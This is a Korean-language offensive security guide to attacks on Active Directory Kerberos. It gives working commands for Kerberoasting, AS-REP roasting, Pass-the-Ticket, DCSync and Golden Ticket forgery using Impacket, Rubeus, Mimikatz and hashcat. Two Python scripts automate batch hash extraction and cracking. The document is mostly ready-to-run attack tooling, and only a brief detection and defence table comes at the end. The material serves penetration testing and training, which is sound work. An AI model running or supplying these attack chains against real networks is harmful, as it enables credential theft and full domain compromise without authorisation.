# Kerberos 공격 — Kerberoasting·AS-REP Roasting·티켓 공격

## 1. Kerberos 인증 흐름

```
클라이언트       KDC (AS)           KDC (TGS)          서비스
    │                │                    │                 │
    │─── AS-REQ ────>│                    │                 │
    │   (사전인증)    │                    │                 │
    │<── AS-REP ─────│                    │                 │
    │   (TGT 발급)   │                    │                 │
    │                │                    │                 │
    │──────── TGS-REQ (TGT 포함) ────────>│                 │
    │<──────── TGS-REP (서비스 티켓) ─────│                 │
    │                                     │                 │
    │──────────── AP-REQ (서비스 티켓) ──────────────────>│
    │<──────────── AP-REP (인증 성공) ────────────────────│
```

---

## 2. Kerberoasting

서비스 계정(SPN 등록)의 TGS 티켓을 요청 후 오프라인 크래킹.

### 2.1 Kerberoasting 실행

```bash
# Impacket GetUserSPNs
python3 GetUserSPNs.py -dc-ip 10.10.10.100 domain.local/user:Password \
  -request -outputfile kerberoast.hashes

# Rubeus (Windows)
.\Rubeus.exe kerberoast /outfile:hashes.txt /nowrap

# PowerView (PowerShell)
Invoke-Kerberoast -OutputFormat hashcat | Select-Object -ExpandProperty Hash |
  Out-File -FilePath kerberoast.hashes

# hashcat으로 크래킹
hashcat -a 0 -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt \
  --rules-file /usr/share/hashcat/rules/best64.rule
```

### 2.2 Kerberoasting 자동화 CLI

```python
#!/usr/bin/env python3
"""Kerberoasting 자동화 — Impacket 기반."""

import argparse
import subprocess
from pathlib import Path
import re


def run_kerberoast(
    dc_ip: str,
    domain: str,
    username: str,
    password: str,
    output_file: Path,
) -> list[str]:
    """GetUserSPNs 실행 후 해시 추출."""
    cmd = [
        "python3", "-m", "impacket.examples.GetUserSPNs",
        f"{domain}/{username}:{password}",
        "-dc-ip", dc_ip,
        "-request",
        "-outputfile", str(output_file),
    ]

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    print(result.stdout)
    if result.returncode != 0:
        print(f"오류: {result.stderr}")
        return []

    hashes = []
    if output_file.exists():
        hashes = output_file.read_text().strip().splitlines()
        print(f"\n[+] 해시 {len(hashes)}개 획득")

    return hashes


def crack_hashes(
    hash_file: Path,
    wordlist: Path,
    rules_file: Path | None = None,
) -> list[str]:
    """hashcat으로 해시 크래킹."""
    cmd = [
        "hashcat", "-a", "0", "-m", "13100",
        str(hash_file), str(wordlist),
        "--potfile-path", "/tmp/kerberoast.pot",
        "--quiet",
    ]
    if rules_file:
        cmd.extend(["--rules-file", str(rules_file)])

    subprocess.run(cmd, timeout=3600)

    # 크래킹된 결과 읽기
    pot_file = Path("/tmp/kerberoast.pot")
    cracked = []
    if pot_file.exists():
        for line in pot_file.read_text().splitlines():
            if ":" in line:
                cracked.append(line.split(":")[-1])

    return cracked


def main() -> None:
    parser = argparse.ArgumentParser(description="Kerberoasting 자동화")
    parser.add_argument("dc", help="도메인 컨트롤러 IP")
    parser.add_argument("domain", help="도메인 (예: corp.local)")
    parser.add_argument("-u", "--user", required=True)
    parser.add_argument("-p", "--password", required=True)
    parser.add_argument("-o", "--output", type=Path, default=Path("/tmp/kerberoast.hashes"))
    parser.add_argument("-w", "--wordlist", type=Path, default=Path("/usr/share/wordlists/rockyou.txt"))
    parser.add_argument("--crack", action="store_true", help="해시 크래킹 실행")
    args = parser.parse_args()

    hashes = run_kerberoast(args.dc, args.domain, args.user, args.password, args.output)

    if args.crack and hashes:
        print("\n[*] 해시 크래킹 시작...")
        cracked = crack_hashes(args.output, args.wordlist)
        print(f"[+] 크래킹 성공: {len(cracked)}개")
        for pw in cracked:
            print(f"  패스워드: {pw}")


if __name__ == "__main__":
    main()
```

---

## 3. AS-REP Roasting

사전 인증이 필요 없는 계정(`DONT_REQ_PREAUTH`)에 AS-REQ 전송 후 오프라인 크래킹.

### 3.1 AS-REP Roasting 실행

```bash
# Impacket GetNPUsers (도메인 계정 없이도 가능)
python3 GetNPUsers.py domain.local/ -dc-ip 10.10.10.100 \
  -usersfile users.txt -format hashcat -outputfile asrep.hashes

# 도메인 계정으로 자동 열거
python3 GetNPUsers.py domain.local/user:Password -dc-ip 10.10.10.100 \
  -request -format hashcat -outputfile asrep.hashes

# hashcat 크래킹 (모드 18200)
hashcat -a 0 -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt

# Rubeus (Windows)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes
```

---

## 4. Pass-the-Ticket (PtT)

```bash
# Mimikatz로 현재 티켓 덤프
mimikatz # sekurlsa::tickets /export

# Rubeus로 특정 서비스 티켓 요청·수출
.\Rubeus.exe tgtdeleg /nowrap
.\Rubeus.exe dump /service:krbtgt /nowrap

# Linux에서 ccache 파일 사용
export KRB5CCNAME=/tmp/admin.ccache
python3 psexec.py -k -no-pass domain.local/admin@dc.domain.local

# Impacket으로 티켓 변환·사용
python3 ticketConverter.py admin.kirbi admin.ccache
```

---

## 5. Golden Ticket (황금 티켓)

```bash
# NTDS.DIT에서 krbtgt 해시 추출 (DCSync)
python3 secretsdump.py -just-dc domain.local/admin:Password@DC_IP

# Mimikatz Golden Ticket 생성
mimikatz # kerberos::golden /user:administrator /domain:domain.local \
  /sid:S-1-5-21-XXXXXXXX-XXXXXXXX-XXXXXXXX /krbtgt:HASH /id:500 /ptt

# Impacket ticketer (Linux)
python3 ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXX \
  -domain domain.local administrator

export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass domain.local/administrator@dc.domain.local
```

---

## 6. Kerberos 공격 자동화 스크립트

```python
#!/usr/bin/env python3
"""Kerberos 공격 체인 자동화 — AS-REP → 크래킹 → 티켓 요청."""

import argparse
import asyncio
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from pathlib import Path


@dataclass
class KerberosTarget:
    username: str
    hash_: str
    cracked_password: str | None = None


def asrep_roast_user(dc_ip: str, domain: str, username: str) -> str | None:
    """단일 사용자 AS-REP Roasting."""
    cmd = [
        "python3", "-m", "impacket.examples.GetNPUsers",
        f"{domain}/{username}",
        "-dc-ip", dc_ip,
        "-no-pass",
        "-format", "hashcat",
    ]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    if "$krb5asrep$" in result.stdout:
        lines = [l for l in result.stdout.splitlines() if "$krb5asrep$" in l]
        return lines[0] if lines else None
    return None


def batch_asrep_roast(
    dc_ip: str,
    domain: str,
    usernames: list[str],
    max_workers: int = 10,
) -> list[KerberosTarget]:
    targets: list[KerberosTarget] = []

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {
            executor.submit(asrep_roast_user, dc_ip, domain, u): u
            for u in usernames
        }
        for future in as_completed(futures):
            username = futures[future]
            hash_ = future.result()
            if hash_:
                print(f"[+] AS-REP 해시 획득: {username}")
                targets.append(KerberosTarget(username=username, hash_=hash_))

    return targets


def crack_kerberos_hashes(
    targets: list[KerberosTarget],
    wordlist: Path,
    hash_mode: int = 18200,  # 18200=AS-REP, 13100=TGS
) -> int:
    if not targets:
        return 0

    # 해시 파일 작성
    hash_file = Path("/tmp/kerberos_hashes.txt")
    hash_file.write_text("\n".join(t.hash_ for t in targets))

    pot_file = Path("/tmp/kerberos.pot")
    pot_file.unlink(missing_ok=True)

    cmd = [
        "hashcat", "-a", "0", f"-m{hash_mode}",
        str(hash_file), str(wordlist),
        "--potfile-path", str(pot_file),
        "--quiet",
    ]
    subprocess.run(cmd, timeout=3600)

    # 크래킹 결과 매핑
    cracked_count = 0
    if pot_file.exists():
        pot_data = dict(
            line.rsplit(":", 1) for line in pot_file.read_text().splitlines() if ":" in line
        )
        for target in targets:
            hash_prefix = target.hash_.split("$")[-1][:20]
            for hash_key, password in pot_data.items():
                if hash_prefix in hash_key:
                    target.cracked_password = password
                    cracked_count += 1
                    print(f"[+] 크래킹 성공: {target.username}:{password}")
                    break

    return cracked_count


def main() -> None:
    parser = argparse.ArgumentParser(description="Kerberos 공격 자동화")
    sub = parser.add_subparsers(dest="cmd", required=True)

    asrep_p = sub.add_parser("asrep", help="AS-REP Roasting")
    asrep_p.add_argument("dc", help="DC IP")
    asrep_p.add_argument("domain")
    asrep_p.add_argument("-U", "--userlist", type=Path, required=True)
    asrep_p.add_argument("-w", "--wordlist", type=Path, help="크래킹용 단어 목록")
    asrep_p.add_argument("--workers", type=int, default=10)

    args = parser.parse_args()

    match args.cmd:
        case "asrep":
            usernames = args.userlist.read_text().splitlines()
            print(f"[*] {len(usernames)}개 계정 AS-REP Roasting 시작")
            targets = batch_asrep_roast(args.dc, args.domain, usernames, args.workers)
            print(f"[+] 해시 {len(targets)}개 획득")

            if args.wordlist and targets:
                cracked = crack_kerberos_hashes(targets, args.wordlist)
                print(f"[+] 크래킹 성공: {cracked}/{len(targets)}")


if __name__ == "__main__":
    main()
```

---

## 7. 탐지 및 방어

| 공격 | 탐지 방법 | 방어 |
|------|-----------|------|
| Kerberoasting | 비정상적인 TGS-REQ 급증 (Event 4769) | 서비스 계정 강력한 패스워드 (25자+) / gMSA 사용 |
| AS-REP Roasting | Event 4768 (RC4 암호화) | 모든 계정 사전 인증 활성화 |
| Pass-the-Ticket | 비정상 티켓 출처 IP | Kerberos Armoring (FAST) |
| Golden Ticket | krbtgt 해시 탈취 탐지 | krbtgt 정기 비밀번호 재설정 (2회) |
| Overpass-the-Hash | NTLM → Kerberos 변환 탐지 | Credential Guard 활성화 |
